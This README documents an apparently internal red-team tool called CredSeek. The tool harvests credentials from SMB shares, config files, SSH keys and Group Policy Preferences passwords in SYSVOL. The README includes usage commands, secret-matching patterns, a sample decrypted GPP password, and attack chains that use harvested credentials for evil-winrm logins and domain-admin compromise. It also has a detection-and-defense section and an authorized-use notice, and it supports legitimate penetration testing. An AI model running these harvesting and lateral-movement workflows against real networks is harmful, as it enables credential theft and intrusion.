# CredSeek v1.0

## 🔐 Automated Credential Harvesting Tool

CredSeek is a comprehensive credential discovery and harvesting tool designed for internal penetration testing. It searches SMB shares, files, and configurations for sensitive credentials including passwords, API keys, SSH keys, Group Policy Preferences (GPP) passwords, and more.

---

## 🎯 Key Features

### Credential Discovery
- **SMB Share Enumeration** - Discovers accessible shares via null sessions or authenticated access
- **File Pattern Matching** - Searches for password files, config files, SSH keys, backup files, scripts, and git repositories
- **Content Analysis** - Extracts credentials from file contents using comprehensive regex patterns
- **GPP Password Extraction** - Automatically decrypts Group Policy Preferences passwords from SYSVOL

### Search Capabilities
- **Password Files**: password.txt, passwords.xlsx, creds.docx, secrets.txt
- **Configuration Files**: .env, config.php, web.config, database.yml, appsettings.json
- **SSH Keys**: id_rsa, id_dsa, id_ecdsa, .pem files
- **Backup Files**: *.backup, *.bak, *.old containing credentials
- **Scripts**: PowerShell, Bash, Python, Batch scripts with embedded credentials
- **Git Repositories**: .git/config for remote URLs with credentials

### Credential Patterns
- **Passwords**: password=, pwd=, passwd=, DB_PASSWORD=
- **Usernames**: username=, user=, login=, DB_USER=
- **API Keys**: api_key=, apikey=, API_TOKEN=
- **Tokens**: token=, auth_token=, bearer=
- **Database Connections**: jdbc:, mongodb://, mysql://
- **AWS Keys**: AKIA[A-Z0-9]{16}, aws_secret_access_key
- **Private Keys**: -----BEGIN RSA PRIVATE KEY-----

---

## 📦 Installation

### Prerequisites
```bash
# Install smbclient for SMB access
sudo apt install smbclient

# Optional: For better file parsing
pip3 install python-docx openpyxl
```

### Setup
```bash
cd Internal/credseek/
chmod +x credseek.py
```

---

## 🚀 Usage

### Basic Usage
```bash
# Scan targets from file
./credseek.py iplist.txt

# Scan single target
./credseek.py 192.168.1.100

# Scan CIDR range
./credseek.py 192.168.1.0/24
```

### Advanced Options
```bash
# Deep search - more file extensions and patterns
./credseek.py iplist.txt --deep

# Search for GPP passwords in SYSVOL (requires DC list)
./credseek.py iplist.txt --gpp dclist.txt

# Specify domain credentials
./credseek.py iplist.txt -u administrator -p Password123 -d CORP

# Increase threading (default: 10)
./credseek.py iplist.txt --threads 20

# Output to JSON
./credseek.py iplist.txt --json
```

### GPP Password Extraction
```bash
# Scan Domain Controllers for GPP passwords
./credseek.py dclist.txt --gpp dclist.txt -u user -p pass -d CORP

# Or just specify DCs directly
./credseek.py --gpp dc01.corp.local,dc02.corp.local -u user -p pass -d CORP
```

---

## 📊 Output Files

### credlist.txt
List of all targets with accessible shares:
```
192.168.1.100:445
192.168.1.101:445
```

### found_files.txt
All discovered files matching credential patterns:
```
\\192.168.1.100\IT_Share\passwords.txt
\\192.168.1.100\Backup\config.php
\\192.168.1.101\Public\id_rsa
```

### found_creds.txt
Extracted credentials with context:
```
[FILE: \\192.168.1.100\IT_Share\passwords.txt]
Type: password
Value: password="SuperSecret123"
Context: admin password="SuperSecret123" database

[FILE: \\192.168.1.100\Backup\config.php]
Type: db_connection
Value: mysql://root:dbpass@localhost/webapp
Context: $db = mysql://root:dbpass@localhost/webapp
```

### cred_details.txt
Human-readable summary with statistics

### cred_details.json
Machine-readable output:
```json
{
  "targets_scanned": 10,
  "shares_found": 25,
  "files_found": 150,
  "credentials_extracted": 45,
  "gpp_passwords": 3,
  "findings": [
    {
      "target": "192.168.1.100",
      "share": "IT_Share",
      "file": "passwords.txt",
      "credential_type": "password",
      "value": "password=\"SuperSecret123\"",
      "context": "admin password=\"SuperSecret123\" database"
    }
  ]
}
```

---

## 🔍 Search Patterns

### File Patterns
CredSeek looks for these file types:

**Password Files:**
- `*password*.txt`, `*passwords*.xlsx`, `*creds*.docx`, `*secret*.txt`

**Config Files:**
- `.env`, `config.php`, `web.config`, `application.properties`, `settings.json`
- `database.yml`, `appsettings.json`, `credentials.xml`

**SSH Keys:**
- `id_rsa`, `id_dsa`, `id_ecdsa`, `*.pem`, `authorized_keys`

**Backup Files:**
- `*.backup`, `*.bak`, `*.old`, `*~`

**Scripts:**
- `*.ps1`, `*.sh`, `*.py`, `*.bat`, `*.cmd`

**Git Repositories:**
- `.git/config`

### Credential Patterns
CredSeek extracts credentials matching these patterns:

**Passwords:**
```
password=value
pwd=value
passwd=value
DB_PASSWORD=value
MYSQL_PASSWORD=value
```

**API Keys:**
```
api_key=value
apikey=value
API_TOKEN=value
X-API-KEY: value
```

**Tokens:**
```
token=value
auth_token=value
bearer=value
access_token=value
```

**Database Connections:**
```
jdbc:mysql://user:pass@host
mongodb://user:pass@host
mysql://user:pass@host
```

**AWS Credentials:**
```
AKIA[A-Z0-9]{16}
aws_secret_access_key
```

**Private Keys:**
```
-----BEGIN RSA PRIVATE KEY-----
-----BEGIN PRIVATE KEY-----
```

---

## 💡 Common Workflows

### Workflow 1: Quick Credential Hunt
```bash
# 1. Discover SMB shares
../smbseek/smbseek.py iplist.txt

# 2. Search for credentials
./credseek.py smblist.txt

# 3. Review findings
cat found_creds.txt
```

### Workflow 2: Deep Credential Discovery
```bash
# 1. Find Domain Controllers
../dcseek/dcseek.py iplist.txt

# 2. Deep search with GPP extraction
./credseek.py iplist.txt --deep --gpp dclist.txt -u user -p pass -d CORP

# 3. Review all findings
cat found_creds.txt
grep "Type: password" found_creds.txt
grep "GPP" found_creds.txt
```

### Workflow 3: Authenticated Credential Search
```bash
# Use valid domain credentials for full access
./credseek.py iplist.txt -u administrator -p Password123 -d CORP --deep

# Check for high-value credentials
grep -i "admin\|root\|sa\|service" found_creds.txt
```

### Workflow 4: Target Specific Shares
```bash
# Search specific high-value shares
./credseek.py fileserver01 -u user -p pass -d CORP

# Common high-value shares to check:
# - SYSVOL (GPP passwords)
# - NETLOGON (login scripts)
# - IT_Share (admin tools)
# - Backup (backup scripts)
# - Scripts (automation)
# - Config (configuration files)
```

---

## 🎯 Integration with Other Tools

### Chain 1: Credentials → Database Access
```bash
# 1. Find credentials
./credseek.py iplist.txt

# 2. Test on databases
../dbseek/dbseek.py iplist.txt -t

# 3. Use extracted DB credentials manually
mysql -h 192.168.1.100 -u root -p extracted_password
```

### Chain 2: Credentials → WinRM Access
```bash
# 1. Extract credentials
./credseek.py iplist.txt -u user -p pass -d CORP

# 2. Test on WinRM
../winrmseek/winrmseek.py iplist.txt -t -u extracted_user -p extracted_pass

# 3. Connect via evil-winrm
evil-winrm -i 192.168.1.100 -u extracted_user -p extracted_pass
```

### Chain 3: GPP → Domain Admin
```bash
# 1. Extract GPP passwords (often domain admin!)
./credseek.py --gpp dclist.txt -u lowpriv -p pass123 -d CORP

# 2. Check if GPP account is admin
../ldapseek/ldapseek.py dclist.txt -u gpp_user -p gpp_pass

# 3. If admin, compromise domain
evil-winrm -i dc01 -u gpp_admin -p gpp_pass
```

---

## 🔐 Group Policy Preferences (GPP) Passwords

### What are GPP Passwords?
Group Policy Preferences allow administrators to set local admin passwords, mapped drives, and scheduled tasks via Group Policy. These passwords are stored **encrypted** in SYSVOL, but Microsoft published the **decryption key** (AES-256), making them trivial to decrypt.

### Why This Matters
- **SYSVOL is readable by all domain users**
- **Passwords are often for local admin accounts**
- **Same password may be reused across many systems**
- **Can lead to complete domain compromise**

### Files to Check
```
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\User\Preferences\Groups\Groups.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\DataSources\DataSources.xml
```

### XML Format
```xml
<Properties action="U" 
  newName="" 
  fullName="" 
  description="" 
  cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
  changeLogon="0" 
  noChange="1" 
  neverExpires="1" 
  acctDisabled="0" 
  userName="Administrator (built-in)"/>
```

### Decryption
CredSeek automatically decrypts cpassword values using the Microsoft-published AES key.

### Example Output
```
[+] GPP Password Found!
File: \\CORP.LOCAL\SYSVOL\CORP.LOCAL\Policies\{...}\Machine\Preferences\Groups\Groups.xml
Username: Administrator (built-in)
Encrypted: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
Decrypted: P@ssw0rd123!
```

---

## 🛡️ Detection & Defense

### Detection
- **File Access Logs** - Monitor access to SYSVOL, NETLOGON, backup shares
- **SMB Enumeration** - Detect null session enumeration attempts
- **Large File Downloads** - Alert on bulk file downloads from shares
- **Credential Harvesting Patterns** - Detect tools like CredSeek, Snaffler

### Defense
**High Priority:**
1. **Remove GPP Passwords** - Run `Remove-GPRegistryValue` to delete GPP passwords
2. **Audit SYSVOL** - Ensure no GPP XML files contain cpassword values
3. **Disable Null Sessions** - `RestrictAnonymous = 2` in registry
4. **Limit Share Access** - Use least privilege for share permissions

**Medium Priority:**
5. **Encrypt Sensitive Files** - Use EFS or BitLocker for files with credentials
6. **Rotate Credentials** - Regularly change passwords in scripts/configs
7. **Use Secret Management** - Store credentials in vaults (CyberArk, HashiCorp)
8. **Monitor Share Access** - Enable auditing on sensitive shares

**Low Priority:**
9. **Remove Old Files** - Delete old configs, backups, scripts with credentials
10. **User Education** - Train users not to store passwords in files

---

## 📝 Tips & Best Practices

### Maximizing Findings
1. **Use Domain Credentials** - Authenticated scans find more shares
2. **Enable --deep Mode** - More file extensions and patterns
3. **Check SYSVOL First** - GPP passwords are critical findings
4. **Search Backup Shares** - Often contain old configs with credentials
5. **Look for Git Repos** - .git/config may have credentials in URLs

### Common Locations
**High-Value Shares:**
- `\\DC\SYSVOL` - GPP passwords
- `\\DC\NETLOGON` - Login scripts
- `\\FileServer\IT_Share` - Admin tools and scripts
- `\\FileServer\Backup` - Backup scripts and configs
- `\\FileServer\Scripts` - Automation scripts

**High-Value Files:**
- `.env` - Environment variables with DB passwords
- `web.config` - ASP.NET connection strings
- `appsettings.json` - .NET Core configuration
- `database.yml` - Rails database config
- `id_rsa` - SSH private keys
- `Groups.xml` - GPP passwords

### False Positives
Some patterns may match non-credentials:
- **Example passwords in documentation**
- **Commented-out credentials**
- **Test/dummy credentials**
- **Password requirements/policies**

Always verify extracted credentials!

### Performance
- **Default threads (10)** - Good for most networks
- **Increase threads (--threads 20)** - Faster but noisier
- **Deep mode** - Slower but more thorough
- **Large shares** - May take time to enumerate

---

## 🚨 Common Findings

### Critical Findings
✅ **GPP Passwords**
- Often local admin passwords
- Can lead to lateral movement
- May be domain admin credentials

✅ **SSH Private Keys**
- Provide server access
- Often no passphrase
- May be reused across systems

✅ **Database Credentials**
- Access to sensitive data
- May be privileged accounts
- Can pivot to other systems

### High-Value Findings
✅ **API Keys**
- Cloud service access
- Third-party integrations
- May have broad permissions

✅ **Service Account Passwords**
- Often privileged
- May be reused
- Can escalate privileges

✅ **Admin Tool Credentials**
- Backup software
- Monitoring tools
- Management consoles

---

## 🔧 Troubleshooting

### No Shares Found
```bash
# Check if SMB is accessible
smbclient -L //192.168.1.100 -N

# Try with credentials
./credseek.py iplist.txt -u user -p pass -d DOMAIN
```

### Permission Denied
```bash
# Use valid domain credentials
./credseek.py iplist.txt -u administrator -p Password123 -d CORP

# Check if account is locked
net user username /domain
```

### GPP Not Working
```bash
# Ensure you're targeting Domain Controllers
../dcseek/dcseek.py iplist.txt

# Use authenticated scan
./credseek.py --gpp dclist.txt -u user -p pass -d CORP

# Manually check SYSVOL
smbclient //dc01/SYSVOL -U user
```

### Slow Performance
```bash
# Increase threads
./credseek.py iplist.txt --threads 20

# Skip deep mode for faster scan
./credseek.py iplist.txt  # without --deep
```

---

## 📚 References

- [MS14-025 - GPP Vulnerability](https://support.microsoft.com/en-us/kb/2962486)
- [AES Key for GPP Decryption](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/)
- [Get-GPPPassword PowerShell Script](https://github.com/PowerShellMafia/PowerSploit)
- [Snaffler Tool](https://github.com/SnaffCon/Snaffler)

---

## 🎓 Related Tools

### In This Suite
- **SMBSeek** - Discover SMB shares (use before CredSeek)
- **LDAPSeek** - Enumerate AD users (find service accounts)
- **WebSeek** - Find .git repos and config files on web servers
- **DbSeek** - Test extracted database credentials

### External Tools
- **Snaffler** - Windows-based credential hunting
- **Invoke-ShareFinder** - PowerShell share enumeration
- **gpp-decrypt** - Standalone GPP password decryptor
- **Impacket secretsdump** - Extract credentials from SAM/NTDS

---

## ⚖️ Legal Notice

**FOR AUTHORIZED PENETRATION TESTING ONLY**

CredSeek is designed for legitimate security assessments with proper authorization. Unauthorized access to computer systems and data is illegal. Always ensure you have written permission before testing.

---

**Version:** 1.0  
**Author:** Internal Red Team  
**License:** Internal Use Only  
**Last Updated:** October 2025
